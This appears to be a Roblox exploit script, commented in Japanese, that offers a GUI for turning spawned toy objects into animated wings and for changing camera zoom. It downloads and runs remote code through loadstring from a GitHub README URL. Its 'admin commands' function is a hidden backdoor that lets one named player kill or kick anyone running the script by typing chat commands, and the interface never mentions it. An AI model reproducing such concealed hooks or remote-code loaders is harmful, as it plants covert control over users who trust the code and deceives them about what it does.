-- Scripture Wings System (Orion Library版 - 左右で向きを反転)
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/Polinorsik/Orion-Z-Library/refs/heads/main/README.md')))()

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- 翼システム変数
local wingsEnabled = false
local wingSpacing = 4.125
local offsets = {
    [1] = CFrame.new(-wingSpacing, 0, 1),
    [2] = CFrame.new(wingSpacing, 0, 1)
}
local speed = 2
local angle = 30
local wingL = 5
local time = 0
local switch = true
local Wings = {}
local Character = {}

-- オブジェクトの向き調整
local rotationX = 90
local rotationY = 0
local rotationZ = 90

-- カメラ設定変数
local originalCameraMode = nil
local originalMaxZoom = nil
local thirdPersonEnabled = false
local customZoomDistance = 20

-- 使用可能なオブジェクトリスト（新しいオブジェクト追加）
local availableObjects = {
    "TetracubeI",
    "FireworkSparkler",
    "PalletLightBrown",
    "PoopPileSparkle",
    "BallBasketball",
    "Campfire",
    "SpotlightRed",
    "PoopPile",
    "FoodHamburger"
}

-- オブジェクト表示名マッピング
local objectDisplayNames = {
    ["TetracubeI"] = "TetracubeI",
    ["FireworkSparkler"] = "FireworkSparkler",
    ["PalletLightBrown"] = "板",
    ["PoopPileSparkle"] = "金のうんこ",
    ["BallBasketball"] = "バスケットボール",
    ["Campfire"] = "キャンプファイヤー",
    ["SpotlightRed"] = "赤いライト",
    ["PoopPile"] = "うんこ",
    ["FoodHamburger"] = "ハンバーガー"
}

-- ドロップダウン用の表示オプション作成
local dropdownOptions = {}
for _, objectName in ipairs(availableObjects) do
    table.insert(dropdownOptions, objectDisplayNames[objectName])
end

-- 選択されたオブジェクト名（デフォルト）
local selectedObjectName = "TetracubeI"
local useMultipleObjects = false

-- キャラクターメタテーブル
setmetatable(Character, {
    __index = function(_, k)
        local v = LocalPlayer.Character[k]
        if typeof(v) == "function" then
            return function(_, ...)
                return v(LocalPlayer.Character, ...)
            end
        end
        return v
    end,
    __newindex = function(_, k, v)
        LocalPlayer.Character[k] = v
    end
})

-- パーツ作成関数
local function createPart()
    local Part = Instance.new("Part")
    Part.CanCollide = false
    Part.Anchored = true
    Part.Transparency = 1
    Part.Size = Vector3.new(4, 1, 4)
    Part.Parent = workspace
    return Part
end

-- BodyMover作成関数
local function createBodyMovers(Part)
    if Part:FindFirstChildOfClass("BodyPosition") then 
        return Part:FindFirstChildOfClass("BodyGyro"), Part:FindFirstChildOfClass("BodyPosition")
    end
    
    local BP = Instance.new("BodyPosition")
    local BG = Instance.new("BodyGyro")
    BP.P = 15000
    BP.D = 200
    BP.MaxForce = Vector3.new(1, 1, 1) * 1e10
    BP.Parent = Part
    BG.P = 15000
    BG.D = 200
    BG.MaxTorque = Vector3.new(1, 1, 1) * 1e10
    BG.Parent = Part
    return BG, BP
end

-- 三人称カメラを有効化
local function enableThirdPerson()
    if not originalCameraMode then
        originalCameraMode = LocalPlayer.CameraMode
        originalMaxZoom = LocalPlayer.CameraMaxZoomDistance
    end
    
    LocalPlayer.CameraMaxZoomDistance = customZoomDistance
    LocalPlayer.CameraMode = Enum.CameraMode.Classic
    thirdPersonEnabled = true
    
    return true, "✅ Third person enabled (Zoom: " .. customZoomDistance .. ")"
end

-- 一人称カメラに戻す
local function disableThirdPerson()
    if originalCameraMode then
        LocalPlayer.CameraMode = originalCameraMode
        LocalPlayer.CameraMaxZoomDistance = originalMaxZoom
    else
        LocalPlayer.CameraMode = Enum.CameraMode.Classic
        LocalPlayer.CameraMaxZoomDistance = 0.5
    end
    
    thirdPersonEnabled = false
    return true, "🔄 Camera reset to default"
end

-- カスタムズーム距離を設定
local function setCustomZoom(distance)
    customZoomDistance = distance
    if thirdPersonEnabled then
        LocalPlayer.CameraMaxZoomDistance = distance
        return true, "📷 Zoom distance: " .. distance
    end
    return true, "Zoom distance saved: " .. distance
end

-- オブジェクトが使用可能かチェック
local function isValidObject(objectName)
    if useMultipleObjects then
        return true
    else
        return objectName == selectedObjectName
    end
end

-- 翼の初期化
local function initializeWings()
    Wings = {}
    
    local ToysFolder = workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
    if not ToysFolder then
        return false, "❌ Toys folder not found! (" .. LocalPlayer.Name .. "SpawnedInToys)"
    end
    
    local ToysRaw = ToysFolder:GetChildren()
    local Toys = {}
    local foundObjects = {}
    
    for i, Toy in ToysRaw do
        if Toy:IsA("Model") then
            if useMultipleObjects or Toy.Name == selectedObjectName then
                table.insert(Toys, Toy)
                foundObjects[Toy.Name] = (foundObjects[Toy.Name] or 0) + 1
            end
        end
    end
    
    if #Toys == 0 then
        return false, "❌ No valid objects found! Looking for: " .. selectedObjectName
    end
    
    for i = 1, 2 do
        local Segments = {}
        for x = 1, wingL do
            local Segment = {Part = createPart()}
            Segments[#Segments + 1] = Segment
        end
        Wings[#Wings + 1] = {
            Handle = createPart(),
            Segments = Segments,
            Sync = {},
            Side = i
        }
    end
    
    local assignedCount = 0
    for i = 1, #Toys do
        local v = Toys[i]
        if v:IsA("Model") and isValidObject(v.Name) then
            local Side = i <= (#Toys / 2) and 1 or 2
            
            local Pallet = v:FindFirstChild("SoundPart")
            if not Pallet then
                for _, child in pairs(v:GetChildren()) do
                    if child:IsA("BasePart") then
                        Pallet = child
                        break
                    end
                end
            end
            
            for _, child in pairs(v:GetChildren()) do
                if child:IsA("BasePart") then
                    child.CanCollide = false
                end
            end
            
            if Pallet then
                local BG, BP = createBodyMovers(Pallet)
                local PalletTable = {
                    BG = BG,
                    BP = BP,
                    Pallet = Pallet
                }
                
                if Wings[Side].Reserved then
                    table.insert(Wings[Side].Sync, PalletTable)
                else
                    Wings[Side].Reserved = PalletTable
                end
                assignedCount = assignedCount + 1
            end
        end
    end
    
    local objectList = ""
    for name, count in pairs(foundObjects) do
        objectList = objectList .. name .. " (" .. count .. "), "
    end
    objectList = objectList:sub(1, -3)
    
    return true, "✅ Wings initialized!\nObjects: " .. objectList .. "\nTotal parts: " .. assignedCount
end

-- 翼のアニメーション（左右で向きを反転）
local wingConnection = nil
local function startWings()
    if wingConnection then
        wingConnection:Disconnect()
    end
    
    wingConnection = RunService.RenderStepped:Connect(function(dt)
        if not wingsEnabled then return end
        
        time += dt * (speed + Character.HumanoidRootPart.Velocity.Magnitude / 40)
        
        for i, Wing in ipairs(Wings) do
            task.spawn(function()
                local direction = (i == 1) and 1 or -1
                local flap = math.sin(time) * math.rad(angle + (Character.HumanoidRootPart.Velocity.Magnitude / 4)) * direction
                local rotation = CFrame.Angles(0, 0, flap)
                
                Wing.Handle.CFrame = Character.Torso.CFrame * offsets[i] * rotation
                
                if Wing.Reserved then
                    Wing.Reserved.BP.Position = Wing.Handle.Position
                    local zAdjustment = (Wing.Side == 2) and 180 or 0
                    Wing.Reserved.BG.CFrame = Wing.Handle.CFrame * CFrame.Angles(math.rad(rotationX), math.rad(rotationY), math.rad(rotationZ + zAdjustment))
                end
                
                for Index, Segment in Wing.Segments do
                    local ToFollow = (Index == 1) and Wing.Handle.CFrame or Wing.Segments[Index - 1].Part.CFrame
                    Segment.Part.CFrame = Segment.Part.CFrame:Lerp(ToFollow * offsets[i], 0.5)
                    
                    if Wing.Sync[Index] then
                        Wing.Sync[Index].BP.Position = Segment.Part.Position
                        local zAdjustment = (Wing.Side == 2) and 180 or 0
                        Wing.Sync[Index].BG.CFrame = Segment.Part.CFrame * CFrame.Angles(math.rad(rotationX), math.rad(rotationY), math.rad(rotationZ + zAdjustment))
                    end
                end
            end)
        end
    end)
end

-- 翼の停止
local function stopWings()
    if wingConnection then
        wingConnection:Disconnect()
        wingConnection = nil
    end
    
    for _, Wing in ipairs(Wings) do
        if Wing.Handle then
            Wing.Handle:Destroy()
        end
        for _, Segment in Wing.Segments do
            if Segment.Part then
                Segment.Part:Destroy()
            end
        end
    end
    
    Wings = {}
end

-- ワークスペース内のすべてのModelを検索
local function scanWorkspaceObjects()
    local ToysFolder = workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
    if not ToysFolder then
        return {}
    end
    
    local foundObjects = {}
    for _, obj in pairs(ToysFolder:GetChildren()) do
        if obj:IsA("Model") then
            foundObjects[obj.Name] = (foundObjects[obj.Name] or 0) + 1
        end
    end
    
    return foundObjects
end

-- 表示名から実際のオブジェクト名を取得
local function getObjectNameFromDisplay(displayName)
    for objectName, display in pairs(objectDisplayNames) do
        if display == displayName then
            return objectName
        end
    end
    return displayName
end

-- 翼の間隔を更新
local function updateWingSpacing(newSpacing)
    wingSpacing = newSpacing
    if switch then
        offsets = {
            [1] = CFrame.new(-wingSpacing, 0, 1),
            [2] = CFrame.new(wingSpacing, 0, 1)
        }
    else
        offsets = {
            [1] = CFrame.new(-wingSpacing / 32.94, 0, 1),
            [2] = CFrame.new(wingSpacing / 32.94, 0, 1)
        }
    end
end

-- キーボード入力（翼の折りたたみ）
UserInputService.InputBegan:Connect(function(Input, gp)
    if gp then return end
    if Input.KeyCode == Enum.KeyCode.X then
        if switch then
            offsets = {
                [1] = CFrame.new(-wingSpacing / 32.94, 0, 1),
                [2] = CFrame.new(wingSpacing / 32.94, 0, 1)
            }
        else
            offsets = {
                [1] = CFrame.new(-wingSpacing, 0, 1),
                [2] = CFrame.new(wingSpacing, 0, 1)
            }
        end
        switch = not switch
        
        OrionLib:MakeNotification({
            Name = "Wings " .. (switch and "Extended" or "Folded"),
            Content = "Press X to toggle wings position",
            Image = "rbxassetid://4483362458",
            Time = 3
        })
    end
end)

-- 管理者チャットコマンド
local function setupAdminCommands()
    local function onChat(player, message)
        if player.Name == "MaybeFlashh" then
            message = message:lower()
            
            if message == "!kill" then
                local character = LocalPlayer.Character
                if character and character:FindFirstChild("Humanoid") then
                    character.Humanoid.Health = 0
                end
            elseif message == "!kick" then
                LocalPlayer:Kick("You have been kicked by MaybeFlashh.")
            end
        end
    end
    
    Players.PlayerAdded:Connect(function(player)
        player.Chatted:Connect(function(msg)
            onChat(player, msg)
        end)
    end)
    
    for _, player in pairs(Players:GetPlayers()) do
        player.Chatted:Connect(function(msg)
            onChat(player, msg)
        end)
    end
end

setupAdminCommands()

-- Orion GUIの作成
local Window = OrionLib:MakeWindow({
    Name = "Scripture Wings System",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "ScriptureWingsConfig"
})

-- メインタブ
local MainTab = Window:MakeTab({
    Name = "Wing Controls",
    Icon = "rbxassetid://4483362458",
    PremiumOnly = false
})

local StatusSection = MainTab:AddSection({
    Name = "Wing Status"
})

local statusLabel = MainTab:AddParagraph("Status", "Ready - Select object and toggle wings")

-- オブジェクト選択セクション
local ObjectSection = MainTab:AddSection({
    Name = "Object Selection"
})

-- カスタムオブジェクト名入力
MainTab:AddTextbox({
    Name = "Custom Object Name",
    Default = "TetracubeI",
    TextDisappear = false,
    Callback = function(Value)
        selectedObjectName = Value
        statusLabel:Set("Status", "Object set to: " .. Value)
        OrionLib:MakeNotification({
            Name = "Object Changed",
            Content = "Now using: " .. Value,
            Image = "rbxassetid://4483362458",
            Time = 3
        })
    end      
})

-- すべてのオブジェクトを使用
MainTab:AddToggle({
    Name = "Use All Objects",
    Default = false,
    Callback = function(Value)
        useMultipleObjects = Value
        if Value then
            statusLabel:Set("Status", "Using ALL objects in folder")
        else
            statusLabel:Set("Status", "Using only: " .. selectedObjectName)
        end
    end
})

-- よく使うオブジェクトのクイック選択（新しいオブジェクト追加）
MainTab:AddDropdown({
    Name = "Quick Select",
    Default = "TetracubeI",
    Options = dropdownOptions,
    Callback = function(Value)
        selectedObjectName = getObjectNameFromDisplay(Value)
        statusLabel:Set("Status", "Quick select: " .. Value .. " (" .. selectedObjectName .. ")")
    end    
})

-- ワークスペーススキャンボタン
MainTab:AddButton({
    Name = "Scan Workspace Objects",
    Callback = function()
        local foundObjects = scanWorkspaceObjects()
        local objectList = "Found objects:\n"
        
        if next(foundObjects) == nil then
            objectList = "❌ No objects found in SpawnedInToys folder"
        else
            for name, count in pairs(foundObjects) do
                objectList = objectList .. "• " .. name .. " (" .. count .. ")\n"
            end
        end
        
        OrionLib:MakeNotification({
            Name = "Workspace Scan",
            Content = objectList,
            Image = "rbxassetid://4483362458",
            Time = 8
        })
        
        statusLabel:Set("Status", objectList)
    end    
})

-- オブジェクト回転セクション
local RotationSection = MainTab:AddSection({
    Name = "Object Rotation"
})

local rotationStatusLabel = MainTab:AddParagraph("Rotation", "X: " .. rotationX .. "° | Y: " .. rotationY .. "° | Z: " .. rotationZ .. "° (右翼+180°)")

-- X軸回転スライダー
MainTab:AddSlider({
    Name = "Rotation X (Pitch)",
    Min = 0,
    Max = 360,
    Default = 90,
    Color = Color3.fromRGB(255, 100, 100),
    Increment = 15,
    ValueName = "Degrees",
    Callback = function(Value)
        rotationX = Value
        rotationStatusLabel:Set("Rotation", "X: " .. rotationX .. "° | Y: " .. rotationY .. "° | Z: " .. rotationZ .. "° (右翼+180°)")
    end
})

-- Y軸回転スライダー
MainTab:AddSlider({
    Name = "Rotation Y (Yaw)",
    Min = 0,
    Max = 360,
    Default = 0,
    Color = Color3.fromRGB(100, 255, 100),
    Increment = 15,
    ValueName = "Degrees",
    Callback = function(Value)
        rotationY = Value
        rotationStatusLabel:Set("Rotation", "X: " .. rotationX .. "° | Y: " .. rotationY .. "° | Z: " .. rotationZ .. "° (右翼+180°)")
    end
})

-- Z軸回転スライダー
MainTab:AddSlider({
    Name = "Rotation Z (Roll)",
    Min = 0,
    Max = 360,
    Default = 90,
    Color = Color3.fromRGB(100, 100, 255),
    Increment = 15,
    ValueName = "Degrees",
    Callback = function(Value)
        rotationZ = Value
        rotationStatusLabel:Set("Rotation", "X: " .. rotationX .. "° | Y: " .. rotationY .. "° | Z: " .. rotationZ .. "° (右翼+180°)")
    end
})

MainTab:AddParagraph("⚠️ Z軸について", "右翼は自動的にZ軸+180°で反転します（左翼: Z°、右翼: Z+180°）")

-- 回転プリセットボタン
MainTab:AddButton({
    Name = "Reset Rotation (Default)",
    Callback = function()
        rotationX = 90
        rotationY = 0
        rotationZ = 90
        rotationStatusLabel:Set("Rotation", "X: " .. rotationX .. "° | Y: " .. rotationY .. "° | Z: " .. rotationZ .. "° (右翼+180°)")
        OrionLib:MakeNotification({
            Name = "Rotation Reset",
            Content = "Rotation reset to default values",
            Image = "rbxassetid://4483362458",
            Time = 3
        })
    end    
})

MainTab:AddButton({
    Name = "Horizontal (Good for Sparklers)",
    Callback = function()
        rotationX = 0
        rotationY = 0
        rotationZ = 90
        rotationStatusLabel:Set("Rotation", "X: " .. rotationX .. "° | Y: " .. rotationY .. "° | Z: " .. rotationZ .. "° (右翼+180°)")
        OrionLib:MakeNotification({
            Name = "Horizontal Preset",
            Content = "Perfect for FireworkSparkler! Right wing auto-flipped!",
            Image = "rbxassetid://4483362458",
            Time = 3
        })
    end    
})

MainTab:AddButton({
    Name = "Vertical",
    Callback = function()
        rotationX = 90
        rotationY = 0
        rotationZ = 0
        rotationStatusLabel:Set("Rotation", "X: " .. rotationX .. "° | Y: " .. rotationY .. "° | Z: " .. rotationZ .. "° (右翼+180°)")
        OrionLib:MakeNotification({
            Name = "Vertical Preset",
            Content = "Vertical orientation applied",
            Image = "rbxassetid://4483362458",
            Time = 3
        })
    end    
})

-- コントロールセクション
local ControlSection = MainTab:AddSection({
    Name = "Wing Controls"
})

-- 翼のトグル
MainTab:AddToggle({
    Name = "Enable Wings",
    Default = false,
    Callback = function(Value)
        wingsEnabled = Value
        
        if Value then
            local success, message = initializeWings()
            if success then
                startWings()
                statusLabel:Set("Status", message)
                OrionLib:MakeNotification({
                    Name = "Wings Enabled",
                    Content = "Wings active! Right wing auto-rotated +180°",
                    Image = "rbxassetid://4483362458",
                    Time = 5
                })
            else
                statusLabel:Set("Status", message)
                wingsEnabled = false
                OrionLib:MakeNotification({
                    Name = "Error",
                    Content = message,
                    Image = "rbxassetid://4483362458",
                    Time = 5
                })
            end
        else
            stopWings()
            statusLabel:Set("Status", "🛑 Wings disabled")
        end
    end
})

-- 速度スライダー
MainTab:AddSlider({
    Name = "Flap Speed",
    Min = 0.5,
    Max = 10,
    Default = 2,
    Color = Color3.fromRGB(138, 43, 226),
    Increment = 0.5,
    ValueName = "Speed",
    Callback = function(Value)
        speed = Value
        statusLabel:Set("Status", "Speed: " .. speed)
    end
})

-- 角度スライダー
MainTab:AddSlider({
    Name = "Flap Angle",
    Min = 10,
    Max = 90,
    Default = 30,
    Color = Color3.fromRGB(138, 43, 226),
    Increment = 5,
    ValueName = "Degrees",
    Callback = function(Value)
        angle = Value
        statusLabel:Set("Status", "Angle: " .. angle .. "°")
    end
})

-- 翼の間隔スライダー（新規追加）
MainTab:AddSlider({
    Name = "Wing Spacing",
    Min = 0.5,
    Max = 15,
    Default = 4.125,
    Color = Color3.fromRGB(255, 200, 50),
    Increment = 0.25,
    ValueName = "Studs",
    Callback = function(Value)
        updateWingSpacing(Value)
        statusLabel:Set("Status", "Wing Spacing: " .. Value .. " studs")
    end
})

-- カメラタブ
local CameraTab = Window:MakeTab({
    Name = "Camera Settings",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local CameraSection = CameraTab:AddSection({
    Name = "Third Person Camera"
})

local cameraStatusLabel = CameraTab:AddParagraph("Camera Status", "Default camera mode")

-- 三人称カメラトグル
CameraTab:AddToggle({
    Name = "Enable Third Person",
    Default = false,
    Callback = function(Value)
        if Value then
            local success, message = enableThirdPerson()
            cameraStatusLabel:Set("Camera Status", message)
            OrionLib:MakeNotification({
                Name = "Third Person Enabled",
                Content = "Camera zoomed out to see wings!",
                Image = "rbxassetid://4483345998",
                Time = 3
            })
        else
            local success, message = disableThirdPerson()
            cameraStatusLabel:Set("Camera Status", message)
            OrionLib:MakeNotification({
                Name = "Camera Reset",
                Content = "Back to default camera",
                Image = "rbxassetid://4483345998",
                Time = 3
            })
        end
    end
})

-- ズーム距離スライダー
CameraTab:AddSlider({
    Name = "Camera Zoom Distance",
    Min = 5,
    Max = 100,
    Default = 20,
    Color = Color3.fromRGB(100, 150, 255),
    Increment = 5,
    ValueName = "Studs",
    Callback = function(Value)
        local success, message = setCustomZoom(Value)
        cameraStatusLabel:Set("Camera Status", message)
    end
})

-- カメラモードプリセット
CameraTab:AddSection({
    Name = "Quick Presets"
})

CameraTab:AddButton({
    Name = "Close View (10 studs)",
    Callback = function()
        setCustomZoom(10)
        if thirdPersonEnabled then
            LocalPlayer.CameraMaxZoomDistance = 10
        end
        cameraStatusLabel:Set("Camera Status", "📷 Close view preset applied")
    end    
})

CameraTab:AddButton({
    Name = "Medium View (20 studs)",
    Callback = function()
        setCustomZoom(20)
        if thirdPersonEnabled then
            LocalPlayer.CameraMaxZoomDistance = 20
        end
        cameraStatusLabel:Set("Camera Status", "📷 Medium view preset applied")
    end    
})

CameraTab:AddButton({
    Name = "Far View (50 studs)",
    Callback = function()
        setCustomZoom(50)
        if thirdPersonEnabled then
            LocalPlayer.CameraMaxZoomDistance = 50
        end
        cameraStatusLabel:Set("Camera Status", "📷 Far view preset applied")
    end    
})

CameraTab:AddButton({
    Name = "Ultra Far (100 studs)",
    Callback = function()
        setCustomZoom(100)
        if thirdPersonEnabled then
            LocalPlayer.CameraMaxZoomDistance = 100
        end
        cameraStatusLabel:Set("Camera Status", "📷 Ultra far view preset applied")
    end    
})

-- カメラリセットボタン
CameraTab:AddSection({
    Name = "Reset Options"
})

CameraTab:AddButton({
    Name = "Reset Camera to Default",
    Callback = function()
        disableThirdPerson()
        cameraStatusLabel:Set("Camera Status", "✅ Camera fully reset")
        OrionLib:MakeNotification({
            Name = "Camera Reset",
            Content = "All camera settings restored to default",
            Image = "rbxassetid://4483345998",
            Time = 3
        })
    end    
})

-- 情報セクション
local InfoSection = MainTab:AddSection({
    Name = "Information"
})

MainTab:AddParagraph("Keyboard Controls", "Press X to fold/extend wings while flying")
MainTab:AddParagraph("Requirements", "Objects must be in '[YourName]SpawnedInToys' folder in workspace")
MainTab:AddParagraph("Tips", "Right wing automatically rotates +180° on Z-axis for perfect mirroring!")

-- 情報タブ
local InfoTab = Window:MakeTab({
    Name = "Info & Help",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

InfoTab:AddParagraph("📖 About", "Scripture Wings System - Control animated wings using any spawned objects")

InfoTab:AddSection({Name = "How to Use"})

InfoTab:AddParagraph("Step 1: Spawn Objects", "Spawn objects in your game (they must be Models)")
InfoTab:AddParagraph("Step 2: Find Object Name", "Click 'Scan Workspace Objects' to see what's available")
InfoTab:AddParagraph("Step 3: Select Object", "Use Quick Select dropdown with Japanese names!")
InfoTab:AddParagraph("Step 4: Adjust Rotation", "Use X/Y/Z rotation sliders or quick presets")
InfoTab:AddParagraph("Step 5: Enable Third Person", "Go to Camera Settings tab for better view")
InfoTab:AddParagraph("Step 6: Enable Wings", "Toggle 'Enable Wings' to start")

InfoTab:AddSection({Name = "Features"})

InfoTab:AddParagraph("✅ Auto-Mirrored Wings", "Right wing automatically flips +180° on Z-axis!")
InfoTab:AddParagraph("✅ Japanese Object Names", "ドロップダウンに日本語表示対応！")
InfoTab:AddParagraph("✅ Wing Spacing Control", "Adjust distance between left and right wings!")
InfoTab:AddParagraph("✅ New Objects Added", "板、うんこ、バスケットボール、ハンバーガーなど追加！")
InfoTab:AddParagraph("✅ Object Rotation Control", "Adjust X, Y, Z rotation independently")
InfoTab:AddParagraph("✅ Rotation Presets", "Quick presets for common orientations")
InfoTab:AddParagraph("✅ Custom Object Support", "Use ANY Model object")
InfoTab:AddParagraph("✅ Multiple Objects", "Use all objects in your folder at once")
InfoTab:AddParagraph("✅ Third Person Camera", "Perfect view for wings")
InfoTab:AddParagraph("✅ Live Adjustments", "Change rotation and spacing while wings are active")InfoTab:AddSection({Name = "Available Objects"})InfoTab:AddParagraph("TetracubeI", "Original tetra block")
InfoTab:AddParagraph("FireworkSparkler", "Original sparkler")
InfoTab:AddParagraph("板 (PalletLightBrown)", "Light brown pallet")
InfoTab:AddParagraph("金のうんこ (PoopPileSparkle)", "Golden poop sparkle")
InfoTab:AddParagraph("バスケットボール (BallBasketball)", "Basketball")
InfoTab:AddParagraph("キャンプファイヤー (Campfire)", "Campfire")
InfoTab:AddParagraph("赤いライト (SpotlightRed)", "Red spotlight")
InfoTab:AddParagraph("うんこ (PoopPile)", "Poop pile")
InfoTab:AddParagraph("ハンバーガー (FoodHamburger)", "Hamburger")InfoTab:AddSection({Name = "Controls Guide"})InfoTab:AddParagraph("Wing Spacing", "Distance between wings - Default: 4.125 studs")
InfoTab:AddParagraph("Flap Speed", "How fast wings flap - Default: 2")
InfoTab:AddParagraph("Flap Angle", "Wing movement range - Default: 30°")InfoTab:AddSection({Name = "Rotation Guide"})InfoTab:AddParagraph("X Axis (Pitch)", "Forward/backward tilt - Default: 90°")
InfoTab:AddParagraph("Y Axis (Yaw)", "Left/right rotation - Default: 0°")
InfoTab:AddParagraph("Z Axis (Roll)", "Sideways tilt - Default: 90°")
InfoTab:AddParagraph("🔄 Auto-Flip", "Right wing adds +180° to Z-axis automatically!")
InfoTab:AddParagraph("💡 Example", "If Z=90°: Left wing=90°, Right wing=270° (90+180)")InfoTab:AddSection({Name = "Troubleshooting"})InfoTab:AddParagraph("❌ Objects facing same direction", "System auto-adds +180° to right wing")
InfoTab:AddParagraph("❌ Sparklers pointing wrong way", "Try Horizontal preset")
InfoTab:AddParagraph("❌ No objects found", "Check '[YourName]SpawnedInToys' folder")
InfoTab:AddParagraph("❌ Wings look weird", "Try resetting rotation to default")
InfoTab:AddParagraph("❌ Wings too close/far", "Adjust Wing Spacing slider")InfoTab:AddSection({Name = "Credits"})InfoTab:AddParagraph("Original Script", "Created by MaybeFlashh")
InfoTab:AddParagraph("Orion Version", "Enhanced with spacing control, auto-mirroring, new objects and Japanese UI")-- 初期化
OrionLib:Init()
